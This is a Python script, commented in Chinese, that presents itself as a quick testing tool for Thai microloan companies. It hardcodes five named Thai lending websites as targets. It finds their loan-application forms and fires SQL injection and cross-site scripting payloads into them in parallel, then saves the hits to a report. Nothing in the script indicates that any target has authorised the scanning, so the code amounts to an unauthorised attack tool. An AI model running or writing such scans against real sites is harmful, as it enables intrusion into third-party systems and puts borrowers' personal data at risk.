#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国小额贷款快速测试工具
Thai Micro Loan Quick Testing Tool

快速批量测试泰国小额贷款公司的贷款申请表
"""

import requests
import json
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

def test_thai_loan_target(target_info):
    """测试单个泰国贷款目标"""
    name = target_info["name"]
    url = target_info["url"]

    print(f"\n测试目标: {name}")
    print(f"URL: {url}")

    results = {
        "target": name,
        "url": url,
        "vulnerabilities": [],
        "status": "completed"
    }

    # 测试路径列表
    test_paths = [
        "/apply", "/loan-application", "/register", "/quick-loan",
        "/api/application", "/api/loan/apply", "/api/user/register"
    ]

    vulnerabilities_found = 0

    for path in test_paths:
        test_url = url + path
        try:
            # 测试基本连接
            response = requests.get(test_url, timeout=10,
                                   headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

            if response.status_code == 200:
                print(f"  发现可用路径: {path} (状态码: {response.status_code})")

                # 检查表单指示器
                content = response.text.lower()
                form_indicators = ["loan", "apply", "application", "form", "submit", "name", "email", "phone"]
                indicator_count = sum(1 for indicator in form_indicators if indicator in content)

                if indicator_count >= 3:
                    vulnerabilities_found += 1
                    results["vulnerabilities"].append({
                        "type": "发现贷款申请表",
                        "url": test_url,
                        "indicator_count": indicator_count
                    })
                    print(f"    发现贷款申请表: {path}")

                    # 测试SQL注入
                    sqli_payloads = ["' OR 1=1--", "' UNION SELECT database()--"]
                    for payload in sqli_payloads:
                        test_data = {"name": payload, "email": "test@test.com"}
                        post_response = requests.post(test_url, data=test_data, timeout=5)

                        sql_errors = ["mysql", "sql", "ora-", "postgresql", "warning"]
                        for error in sql_errors:
                            if error in post_response.text.lower():
                                vulnerabilities_found += 1
                                results["vulnerabilities"].append({
                                    "type": "SQL注入漏洞",
                                    "url": test_url,
                                    "payload": payload
                                })
                                print(f"    发现SQL注入: {test_url}")
                                break

                    # 测试XSS
                    xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
                    for payload in xss_payloads:
                        test_data = {"name": payload, "email": "test@test.com"}
                        post_response = requests.post(test_url, data=test_data, timeout=5)

                        if payload in post_response.text:
                            vulnerabilities_found += 1
                            results["vulnerabilities"].append({
                                "type": "XSS漏洞",
                                "url": test_url,
                                "payload": payload
                            })
                            print(f"    发现XSS漏洞: {test_url}")
                            break

        except Exception as e:
            continue

    print(f"完成测试 {name}: 发现 {vulnerabilities_found} 个潜在问题")
    results["vulnerability_count"] = vulnerabilities_found
    return results

def main():
    """主函数"""
    print("泰国小额贷款快速批量测试工具")
    print("=" * 50)

    # 泰国小额贷款目标列表
    thai_loan_targets = [
        {"name": "MoneyCat Thailand", "url": "https://www.moneycat.co.th"},
        {"name": "Mula-X", "url": "https://mula-x.com"},
        {"name": "Rocket Cash", "url": "https://www.rocket-cash.com"},
        {"name": "KLoan Thailand", "url": "https://kloan.co.th"},
        {"name": "NgoenMun Finance", "url": "https://ngoenmun.com"}
    ]

    start_time = time.time()
    all_results = []

    print(f"开始批量测试 {len(thai_loan_targets)} 个泰国小额贷款目标...\n")

    # 使用线程池并发测试
    with ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(test_thai_loan_target, target) for target in thai_loan_targets]

        for future in futures:
            try:
                result = future.result()
                all_results.append(result)
            except Exception as e:
                print(f"测试失败: {str(e)}")

    # 生成统计报告
    end_time = time.time()
    duration = end_time - start_time

    total_vulnerabilities = sum(r["vulnerability_count"] for r in all_results)

    print("\n" + "=" * 50)
    print("测试完成!")
    print(f"测试时长: {duration:.2f} 秒")
    print(f"总目标数: {len(thai_loan_targets)}")
    print(f"发现问题总数: {total_vulnerabilities}")

    print("\n详细结果:")
    for result in all_results:
        print(f"\n{result['target']}:")
        print(f"  URL: {result['url']}")
        print(f"  发现问题: {result['vulnerability_count']} 个")
        for vuln in result['vulnerabilities']:
            print(f"    - {vuln['type']}: {vuln.get('url', 'N/A')}")

    # 保存报告
    report_data = {
        "scan_time": datetime.now().isoformat(),
        "duration_seconds": duration,
        "targets_tested": len(thai_loan_targets),
        "total_vulnerabilities": total_vulnerabilities,
        "results": all_results
    }

    report_file = f"thai_loan_quick_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump(report_data, f, ensure_ascii=False, indent=2)

    print(f"\n报告已保存到: {report_file}")

    if total_vulnerabilities > 0:
        print(f"\n发现 {total_vulnerabilities} 个潜在安全问题，建议进一步检查。")
    else:
        print("\n未发现明显的安全问题，但建议进行更深入的测试。")

if __name__ == "__main__":
    main()